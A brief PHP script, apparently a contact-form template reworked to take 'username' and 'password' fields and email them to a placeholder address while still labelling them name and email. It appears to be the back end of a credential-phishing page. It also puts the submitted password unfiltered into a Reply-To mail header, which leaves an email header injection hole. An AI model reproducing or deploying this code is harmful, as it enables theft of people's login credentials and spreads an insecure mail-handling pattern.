<?php
// Check for empty fields
if (empty($_POST['username']) ||
   empty($_POST['password'])) {
    echo 'No arguments Provided!';
    return false;
}
   
$name = strip_tags(htmlspecialchars($_POST['username']));
$email_address = strip_tags(htmlspecialchars($_POST['password']));
// Create the email and send the message
$to = 'yourname@yourdomain.com'; // Add your email address in between the '' replacing yourname@yourdomain.com - This is where the form will send a message to.
$email_subject = "Website Contact Form:  $name";
$email_body = "You have received a new message from your website contact form.\n\n"."Here are the details:\n\nName: $name\n\nEmail: $email_address\n\nPhone:";
$headers = "From: noreply@yourdomain.com\n"; // This is the email address the generated message will be from. We recommend using something like noreply@yourdomain.com.
$headers .= "Reply-To: $email_address";
mail($to, $email_subject, $email_body, $headers);
return true;
